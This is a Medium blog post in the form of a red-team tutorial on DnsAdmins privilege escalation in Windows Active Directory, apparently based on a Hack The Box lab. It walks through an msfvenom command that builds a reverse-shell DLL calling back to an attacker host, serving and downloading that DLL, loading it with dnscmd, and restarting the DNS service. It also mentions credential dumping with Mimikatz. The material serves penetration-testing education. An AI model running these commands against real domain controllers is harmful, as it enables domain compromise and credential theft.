---
title: DnsAdmins PrivEsc
description: Hello, hackers! Today, I’ll be discussing a common Windows privilege escalation technique, as well as one of the persistence methods used by APT groups:DNSAdmins. I first encountered this technique wh
pubDate: 2024-10-08
tags:
  - Security Research
  - Red Team
  - privilege_Escalation
  - DNS
author: Mohamed Eletrepy (maverick)
readingTime: 3
coverImage: https://cdn-images-1.medium.com/max/800/0*weEIv7CaPMXn1K9d.jpeg
---

---

### DnsAdmins PrivEsc

First Thing: Free Palestine 🇵🇸

![](https://cdn-images-1.medium.com/max/800/0*weEIv7CaPMXn1K9d.jpeg)

*Free Palestine with every single drop of my blood*

Hello, hackers! Today, I’ll be discussing a common Windows privilege escalation technique, as well as one of the persistence methods used by APT groups: **DNSAdmins**. I first encountered this technique while solving the *Resolute* machine, and it was incredible. I created a reverse shell, uploaded it to the compromised machine, and used the `dnscmd` utility to execute it, giving me a shell. But it doesn't stop there—you can do more than just execute a reverse shell. You can run commands to add yourself to the Domain Admins group or run Mimikatz modules to dump credentials, for example.

#### When the Attack Occurs

The following attack can occur when DNS is executed on a Domain Controller, which is quite common:

DNS management operates over RPC. The **ServerLevelPluginDll** registry key permits loading a custom DLL without verifying the DLL’s path. This can be achieved using the `dnscmd` tool via the command line.

When a member of the **DnsAdmins** group executes the `dnscmd` command, it populates the registry key at **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll**.

Once the DNS service is restarted, the DLL specified in this path will be loaded — this could be a network share accessible by the Domain Controller’s machine account. An attacker could then load a custom DLL to obtain a reverse shell or even utilize a tool like Mimikatz as a DLL to dump credentials.

---

Now, let’s venture into the Attack Path and harness the power of this technique!

![](https://cdn-images-1.medium.com/max/800/0*u9ZZan6uHQClZwYL.gif)

#### Constructing Malicious DLL

```bash
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.16.16 LPORT=9001 -f dll > reverse.dll  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload  
No encoder specified, outputting raw payload  
Payload size: 460 bytes  
Final size of dll file: 9216 bytes
```

#### Starting Local HTTP Server

```bash
python -m http.server 1337  
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

**Downloading the file to the compromised machine.**

```powershell
PS C:\Users\netadm> wget "http://10.10.16.16:1337/reverse.dll" -OutFile "reverse.dll"  
PS C:\Users\netadm> ls  
  
  
Directory: C:\Users\netadm  
  
  
Mode LastWriteTime Length Name  
---- ------------- ------ ----  
d-r--- 5/19/2021 1:38 PM 3D Objects  
d-r--- 5/19/2021 1:38 PM Contacts  
d-r--- 6/8/2021 9:19 PM Desktop  
d-r--- 5/19/2021 1:38 PM Documents  
d-r--- 5/19/2021 1:38 PM Downloads  
d-r--- 5/19/2021 1:38 PM Favorites  
d-r--- 5/19/2021 1:38 PM Links  
d-r--- 5/19/2021 1:38 PM Music  
d-r--- 5/19/2021 1:38 PM Pictures  
d-r--- 5/19/2021 1:38 PM Saved Games  
d-r--- 5/19/2021 1:38 PM Searches  
d-r--- 5/19/2021 1:38 PM Videos  
-a---- 10/8/2024 5:56 AM 9216 reverse.dll
```

#### Executing Custom DLL

```powershell
PS C:\Users\netadm> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\reverse.dll  
  
Registry property serverlevelplugindll successfully reset.  
Command completed successfully.
```

#### Stopping And Then Starting DNS Service

```powershell
PS C:\Users\netadm> sc.exe stop dns  
  
SERVICE_NAME: dns  
TYPE : 10 WIN32_OWN_PROCESS  
STATE : 3 STOP_PENDING  
(STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)  
WIN32_EXIT_CODE : 0 (0x0)  
SERVICE_EXIT_CODE : 0 (0x0)  
CHECKPOINT : 0x1  
WAIT_HINT : 0x7530  
PS C:\Users\netadm> sc.exe start dns  
  
SERVICE_NAME: dns  
TYPE : 10 WIN32_OWN_PROCESS  
STATE : 2 START_PENDING  
(NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)  
WIN32_EXIT_CODE : 0 (0x0)  
SERVICE_EXIT_CODE : 0 (0x0)  
CHECKPOINT : 0x1  
WAIT_HINT : 0x4e20  
PID : 6244  
FLAGS :
```

**And here we go!**

![](https://cdn-images-1.medium.com/max/800/1*yeYZEqTHStzCX1sI-aPJKQ.png)

![](https://cdn-images-1.medium.com/max/800/0*uIq8sgkl0vN1paJg.gif)

This technique is quite simple, but you can certainly enhance it. Of course, you can create your own DLL file and modify it as needed. However, keep in mind that this technique is a highly destructive attack, so it’s essential to inform your client before proceeding. If you are on a red team engagement, make sure to be as stealthy as possible.

See you with the next technique!

Don’t forget to follow me on [LinkedIn ](https://www.linkedin.com/in/0xmaverick/)and [Twitter](https://x.com/mavric1337), and give me some respect on [Hack The Box!](https://app.hackthebox.com/profile/1054724)

![](https://cdn-images-1.medium.com/max/800/0*9Fh39CiNSFstL0iy.gif)

#### References

> 🔗 [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)

> 🔗 [https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/privilege-escalation/dnsadmin](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/privilege-escalation/dnsadmin)

> 🔗 [https://www.semperis.com/blog/dnsadmins-revisited/](https://www.semperis.com/blog/dnsadmins-revisited/)

By Mohamed Eletreby on October 8, 2024.

Canonical link

Exported from Medium on April 20, 2026.